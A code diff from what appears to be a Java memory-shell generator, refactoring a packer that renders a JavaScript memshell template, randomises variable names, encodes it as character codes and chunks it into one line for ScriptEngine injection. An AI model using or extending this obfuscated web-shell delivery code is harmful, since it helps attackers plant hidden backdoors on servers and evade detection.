@@ -5,7 +5,9 @@ import org.leo.jmg.mem.packer.Packer;
 import org.leo.jmg.mem.packer.PackerCapability;
 import org.leo.jmg.mem.packer.PackerMeta;
 import org.leo.jmg.mem.packer.TemplateRenderer;
-import org.leo.jmg.mem.packer.Util;
+import org.leo.jmg.mem.packer.PackerResources;
+import org.leo.jmg.mem.packer.obfuscation.LiteralObfuscator;
+import org.leo.jmg.mem.packer.obfuscation.PayloadObfuscator;
 
 import static org.leo.jmg.mem.packer.scriptengine.DefaultScriptEnginePacker.scriptToSingleLine;
 
@@ -17,12 +19,13 @@ import static org.leo.jmg.mem.packer.scriptengine.DefaultScriptEnginePacker.scri
         requiredClasses = "javax.script.ScriptEngineManager"
 )
 public class ScriptEngineNoSquareBracketsPacker implements Packer {
-    private final String jsTemplate = Util.loadTemplateFromResource("/memshell-template/ScriptEngineNoSquareBrackets.js.txt");
+    private final String jsTemplate = PackerResources.loadTemplate("/memshell-template/ScriptEngineNoSquareBrackets.js.txt");
 
     @Override
     public String pack(ClassPackerConfig config) {
         // TemplateRenderer 在渲染阶段完成变量名随机化（{{VAR:x}} 占位符）
         String script = TemplateRenderer.render(jsTemplate, config);
-        return scriptToSingleLine(Util.chunkPayload(Util.ghostBitsEncodeJs(script)));
+        return scriptToSingleLine(PayloadObfuscator.chunk(
+                LiteralObfuscator.javascriptCharCodes(script)));
     }
 }
